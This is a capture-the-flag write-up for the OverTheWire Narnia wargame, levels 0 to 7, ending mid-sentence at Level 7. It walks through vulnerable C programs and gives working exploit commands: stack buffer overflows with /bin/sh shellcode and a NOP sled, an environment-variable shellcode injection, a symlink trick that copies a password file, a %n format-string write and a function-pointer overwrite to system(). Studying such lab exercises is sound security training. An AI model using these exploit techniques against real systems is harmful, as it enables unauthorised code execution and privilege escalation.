#Narnia
Narnia is a CTF hosted at overthewire.org/wargames/narnia.  My writeups for the levels will be posted here.
#Level0
Login to level 0 with `ssh narnia0@narnia.labs.overthewire.org` with password naria0.
The levels are all located in the /narnia directory once you are logged in, and the source code for each level is provided.
narnia0.c:
```
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef)
		system("/bin/sh");
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}
```
Looking at the code we can see that if we overflow buf[20], it will overflow in to val. In order to get the shell, we need to make val contain 0xdeadbeef.
I first entered `perl -e 'print "A"x20 . "\xef\xbe\xad\xde"' | ./narnia0`.  This passed the comparison and allowed the system("/bin/sh") line to execute, but the shell was immediately closed because I didn't have any input to give it. 
Next, I modified my input to be `(perl -e 'print "A"x20 . "\xef\xbe\xad\xde"'; cat) | ./narnia0` which allowed me to keep the shell open (with the shell open as narnia1)
#Level1
```
#include <stdio.h>

int main(){
        int (*ret)();

        if(getenv("EGG")==NULL){
                printf("Give me something to execute at the env-variable EGG\n");
                exit(1);
        }

        printf("Trying to execute EGG!\n");
        ret = getenv("EGG");
        ret();

        return 0;
}
```
So this code is going to get an environmental variable and then execute it.  Therefore, we want to put some executable code in to an evironmental variable called EGG.  I used the shellcode for execve("/bin/sh") I found at http://shell-storm.org/shellcode/files/shellcode-811.php and issued the command `export EGG=`perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80"'``.  When I ran the program, I was given a shell as narnia2.
#Level2
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
        char buf[128];

        if(argc == 1){
                printf("Usage: %s argument\n", argv[0]);
			exit(1);
        }
        strcpy(buf,argv[1]);
        printf("%s", buf);

        return 0;
}
```
In this level, the input that we pass the program is copied in to buf[128] using strcpy.  I played around with the inputs to the program and saw that when I sent it Ax139, the program executed with no problems, but when I sent it Ax140, it crashed with "Illegal instruction". 
I opened it up in GDB to get a better idea of what I needed to overflow it with:
```
Dump of assembler code for function main:
   0x0804845d <+0>:	push   ebp
   0x0804845e <+1>:	mov    ebp,esp
=> 0x08048460 <+3>:	and    esp,0xfffffff0
   0x08048463 <+6>:	sub    esp,0x90
   0x08048469 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x0804846d <+16>:	jne    0x8048490 <main+51>
   0x0804846f <+18>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048472 <+21>:	mov    eax,DWORD PTR [eax]
   0x08048474 <+23>:	mov    DWORD PTR [esp+0x4],eax
   0x08048478 <+27>:	mov    DWORD PTR [esp],0x8048560
   0x0804847f <+34>:	call   0x8048310 <printf@plt>
   0x08048484 <+39>:	mov    DWORD PTR [esp],0x1
   0x0804848b <+46>:	call   0x8048340 <exit@plt>
   0x08048490 <+51>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048493 <+54>:	add    eax,0x4
   0x08048496 <+57>:	mov    eax,DWORD PTR [eax]
   0x08048498 <+59>:	mov    DWORD PTR [esp+0x4],eax
   0x0804849c <+63>:	lea    eax,[esp+0x10]
   0x080484a0 <+67>:	mov    DWORD PTR [esp],eax
   0x080484a3 <+70>:	call   0x8048320 <strcpy@plt>
   0x080484a8 <+75>:	lea    eax,[esp+0x10]
   0x080484ac <+79>:	mov    DWORD PTR [esp+0x4],eax
   0x080484b0 <+83>:	mov    DWORD PTR [esp],0x8048574
   0x080484b7 <+90>:	call   0x8048310 <printf@plt>
   0x080484bc <+95>:	mov    eax,0x0
   0x080484c1 <+100>:	leave  
   0x080484c2 <+101>:	ret    
End of assembler dump.
(gdb) break *0x080484a3
```
I set a break point write before the call to strcpy() and ran the program with an input of 140 A's. (`r `perl -e 'print "A"x140'``)
The syntax for strcpy is strcpy(char *dest,char *src).  Since I broke at strcpy, I can print out the stack to see what those two arguments are:
```
(gdb) x/4wx $esp
0xffffd640:	0xffffd650	0xffffd8a4	0x00000000	0x00000000
```
The destination is at 0xffffd650 and the source is at 0xffffd8a4
Additionally, with `info frame` I see that eip is saved at 0xffffd6dc.  0xffffd6dc-0xffffd650=0x8c(140 decimal), which confirms why we saw the program crashing early.  We have a couple of options of how to exploit at this point, but I'll choose the simples and place my shellcode in buf[] and overwrite eip with the location of buf[] since my shellcode is only 28 bytes so I have plenty of space for it.
My shellcode will take 28 bytes, so will print my shellcode, then 140-28=112 A's and then my return address which is 0xffffd650.  Taking endianess in to account, the final exeuction is:
`./narnia2 `perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80" . "A"x112 . "\x50\xd6\xff\xff"'``
When I execute this I'm granted a shell as narnia3 
#Level3
```
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

        int  ifd,  ofd;
        char ofile[16] = "/dev/null";
        char ifile[32];
        char buf[32];

        if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
        }

        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
        }

        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

        /* close 'em */
        close(ifd);
        close(ofd);

        exit(1);
}
```
This program is copying the file we tell it to /dev/null.  The vulnerability is taht there are no checks on the bounds of ifile when strcpy is used.  We can overflow ifile in order to overwite ofile and output to somewhere other than /dev/null. If I could have ifile point to the /etc/narnia_pass/narnia4 file and the output be somewhere I could read, I could get the program to copy the password for me.
First I made a symbolic link:
```
ln -s /etc/narnia_pass/narnia4 /tmp/me/test12345678901234567890/tmp/me/ab
```
This linked the /tmp/me/test12345678901234567890/tmp/me/ab file to the narnia password.  I then read the program with "./narnia3 /tmp/me/test12345678901234567890/tmp/me/a"  and was then able to cat the password from /tmp/me/ab.  The reason ofile is /tmp/me/ab is because those are the values in memory immedaitely after the 32 characters of ifile.
#Level4
```
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
	int i;
	char buffer[256];

	for(i = 0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));

	if(argc>1)
		strcpy(buffer,argv[1]);

	return 0;
}
```
Level 4 looks to be another buffer overflow, similar to level 2.  I think level 2 I was supposed to place the shellcode in to an environment variable, which level 4 is preventing.  Since I didn't use that method for level 2, this level will mostly be a repeat.
Examinging the stack again, I see that my string is going to be copied to 0xffffd57c and eip is saved at 0xffffd68c.  0xffffd68c-0xffffd57c=0x110 (272 decimal).  So, I will print out by 28 byte shellcode, 272-28 A's and then what I want EIP to be (0xffffd57c).
I executed the command ./narnia4 `perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80" . "A"x244 . "\x7c\xd5\xff\xff"'` but was surprised when it didn't work. I opened it up in gdb and checked and now the buffer was at 0xffffd55c instead of 7c.  I believe the offsets were slightly changing, so I decided to put a NOP sled before my code to improve my odds of hitting what I wanted.
I came up with the following payload:
```
/narnia/narnia4 `perl -e 'print "\x90"x244 . "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80" . "\x5c\xd5\xff\xff"'`
```
Unfortunately I was still getting a segmentation fault and couldn't get it to run. 
I began debugging it further in GDB.  In GDB I saw I got to my NOP sled and to my shellcode, however the disassembly for my shellcode didn't look right:
```
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80

(gdb) x/10b $pc-1
0xffffd664:	0x2f	0x62	0x69	0x6e	0x2f	0x2f	0x73	0x68
0xffffd66c:	0x00	0x00
(gdb) x/10i $pc-1
   0xffffd664:	das    
=> 0xffffd665:	bound  %ebp,0x6e(%ecx)
   0xffffd668:	das    
   0xffffd669:	das    
   0xffffd66a:	jae    0xffffd6d4
   0xffffd66c:	add    %al,(%eax)
   0xffffd66e:	add    %al,(%eax)
   0xffffd670:	add    %al,(%eax)
   0xffffd672:	add    %al,(%eax)
   0xffffd674:	add    $0xd7,%al
``` 
The memory at 0xffffd66c appears be corrupted.  I'm not sure why this is, but in any case it looks like I don't have as much space as I thought I had for my shellcode, so let's shorten up the NOP's, and then put some garbage after our shellcode.
After adjustments, my command was: `perl -e 'print "\x90"x144 . "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80" . "B"x100 . "\x5c\xd5\xff\xff"'`
I ran that and it worked in GDB!  When I ran it from the prompt it did not, presumably due to the gdb offset, so I modified it to be:
````perl -e 'print "\x90"x144 . "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80" . "B"x100 . "\x7c\xd5\xff\xff"'````
And finally it worked!
#Level5
````
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
        int i = 1;
        char buffer[64];

        snprintf(buffer, sizeof buffer, argv[1]);
        buffer[sizeof (buffer) - 1] = 0;
        printf("Change i's value from 1 -> 500. ");

        if(i==500){
                printf("GOOD\n");
                system("/bin/sh");
        }

        printf("No way...let me give you a hint!\n");
        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
        printf ("i = %d (%p)\n", i, &i);
        return 0;
}
```
The goal here is to overflow buffer[64] and overwrite i with 500.  The program is using the safer version of printf by using snprintf which will print out a maximum of sizeof(buffer) bytes.
I'm guessing the solution has to do with using format strings in the snprintf call so I took a look at http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
Using that guide I see I can print out the values of the stack
```
narnia5@narnia:/narnia$ ./narnia5 0x%08x0x%08x0x%08x0x%08x0x%08x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [0xf7eb87160xffffffff0xffffd74e0xf7e30c340x37667830] (50)
i = 1 (0xffffd76c)
```
Page 14 from https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf does a good job of explaining how we can write to a memory location using the %n formatter.
```
./narnia5 `perl -e 'print "\x6c\xd7\xff\xff" . "%x%x%x%472d%n"'
```
Note: 472=500-(4 bytes for ret + 24 bytes (8 bytes for each of the three %x's returned)
This command worked and I was now narnia6!
#Level6
Source code for level6:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
    char b1[8], b2[8];
    int  (*fp)(char *)=(int(*)(char *))&puts, i;

    if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

    /* clear environ */
    for(i=0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));
    /* clear argz    */
    for(i=3; argv[i] != NULL; i++)
        memset(argv[i], '\0', strlen(argv[i]));

    strcpy(b1,argv[1]);
    strcpy(b2,argv[2]);
    //if(((unsigned long)fp & 0xff000000) == 0xff000000)
    if(((unsigned long)fp & 0xff000000) == get_sp())
        exit(-1);
    fp(b1);

    exit(1);
}
```
Ok, so this has two 8 byte char arrays b1 and b2 and we are copying the first
two command line arguments in to these values using the dangerous strcpy
function.  After the strcpys are done, we check to see if  fp()&0xff000000 == get_sp().
fp() is a function pointer to the puts() function and is going to be called as
long as  the high byte of the ESP isn't the same as the high byte of fp.  fp is
located right after the b1,b2 declarations, so looks like something we can
easily overflow.  The argument being passed to fp is b1 (which we also
control), so maybe we can overflow fp with the address of system() and set b1
to '/bin/sh'.
Time to open up gdb!
I open up gdb and set a breakpoint on the call to get_sp() and run the next
instruction.  At this point EAX = 0xff000000.  Okay, so I know I need to
overflow fp to not have 0xff in the high byte.  Let's print out the locations
of a few variables.
Unfortunately symbols have been stripped, so `print $b1` doesn't work.
Fortunately this is a pretty short file and the assembly is pretty clear. In
order to exploit this, I'll probably need to know the address of b1,b2 and fp.
Looking at the C, the calls to strcpy are the easiest to get the addresses of
b1/b2 and the direct call to fp is the easiest way to get fp's address.
I set a breakpoint in strcpy and print the stack (x/10wx $esp) to get
that the location of b1 as 0xffffd6b0 and b2 as 0xffffd6a8.
The call to fp looks like:
```
 0x080486ae <+341>: mov    eax,DWORD PTR [esp+0x28]
   0x080486b2 <+345>:   call   eax
```
Printing this out:
```
(gdb) print $esp+0x28
$4 = (void *) 0xffffd6b8
```
So b2-fp = 0x10 and b1-fp=0x8 and b2-b1=0x8
So if we set b1 to 8 bytes followed by system() and set b2 to 8 bytes followed
by "/bin/sh", we'll be able to change the fp(b1) call to actually be
system("/bin/sh");
Let's get the address of system:
```
(gdb) print &system
$7 = (<text variable, no debug info> *) 0xf7e62e70 <system>
```
r `perl -e 'print "A"x8 . "\x70\x2e\xe6\xf7" . " ". "B"x8 . "/bin/sh"'`
And it worked!
#Level7
```
int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;
  
        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the
Hackedfunction..\n");
        fflush(stdout);
        
        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
    fflush(stdout);
        system("/bin/sh");

        return 0;
}
```
Ok so this program 
